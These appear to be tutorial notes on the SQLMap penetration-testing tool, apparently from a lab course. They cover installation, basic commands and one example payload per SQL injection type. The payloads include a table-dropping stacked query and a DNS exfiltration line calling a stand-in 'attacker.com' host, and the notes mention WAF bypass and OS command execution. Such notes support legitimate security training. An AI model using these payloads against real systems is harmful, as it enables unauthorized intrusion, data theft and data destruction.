# SQLMap Overview

SQLMap is an open-source penetration testing tool written in Python designed to automate the detection and exploitation of SQL injection (SQLi) vulnerabilities. It has been continuously developed since 2006 and is still actively maintained.

## Basic Usage

SQLMap can be executed with the following basic command:

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

The tool automates tasks like detecting injection points, fingerprinting, enumeration, and exploiting vulnerabilities.

---
## SQLMap Features

- **Target connection testing**
- **Injection detection**
- **Fingerprinting of DBMS**
- **Database content retrieval**
- **OS Command Execution**
- **Bypassing WAF/IPS/IDS using tamper scripts**

## Installation

SQLMap is pre-installed on many security-focused operating systems like Pwnbox. To install on Debian-based systems, use:

```bash
sudo apt install sqlmap
```

To install manually, use:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Run SQLMap with:

```bash
python sqlmap.py
```

## Supported SQL Injection Types

SQLMap can detect and exploit all known SQL injection types. These include:

### 1. **Boolean-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=1
  ```
- Relies on TRUE/FALSE results from server responses.

### 2. **Error-based SQL Injection**
- **Example:**
  ```sql
  AND GTID_SUBSET(@@version,0)
  ```
- Uses DBMS errors to retrieve data in "chunks."

### 3. **Union Query-based SQL Injection**
- **Example:**
  ```sql
  UNION ALL SELECT 1,@@version,3
  ```
- Allows extending queries to inject results into the response.

### 4. **Stacked Queries**
- **Example:**
  ```sql
  ; DROP TABLE users
  ```
- Executes multiple queries in a single request (supported on certain DBMS like Microsoft SQL Server).

### 5. **Time-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=IF(2>1,SLEEP(5),0)
  ```
- Differentiates between TRUE/FALSE based on response time.

### 6. **Inline Queries**
- **Example:**
  ```sql
  SELECT (SELECT @@version) from
  ```
- Embeds sub-queries in the original query.

### 7. **Out-of-band SQL Injection**
- **Example:**
  ```sql
  LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
  ```
- Uses DNS exfiltration to retrieve data when other methods are slow or unsupported.

## Additional Features

SQLMap includes advanced techniques like:

- **Protection Detection & Bypass**: Using tamper scripts to avoid WAF/IPS/IDS detection.
- **File System Access**: Retrieving files from the server.
- **OS Command Execution**: Running system commands through SQL injection.

---

# Getting Started with SQLMap

## Basic Help Command
```bash
$ sqlmap -h
```
Shows basic usage and common options.

### Common Options:
- `-u URL`: Target URL (e.g., `http://example.com/vuln?id=1`)
- `-v VERBOSE`: Set verbosity (0-6, default 1)
- `-h`: Show help message
- `--version`: Show version

## Advanced Help Command
```bash
$ sqlmap -hh
```
Shows detailed options for configuring targets, requests, and connection methods.

## Example Usage
Test for SQL injection on a target URL:
```bash
sqlmap -u "http://example.com/vuln.php?id=1" --batch
```

- **`--batch`**: Skip user input, use default choices.

## Output Overview:
- **Testing**: SQLMap checks for vulnerabilities in the URL.
- **Injection Points**: Identifies if parameters (like `id`) are vulnerable to SQLi.
- **Payloads**: Tests various SQLi payloads like boolean-based, time-based, or error-based.
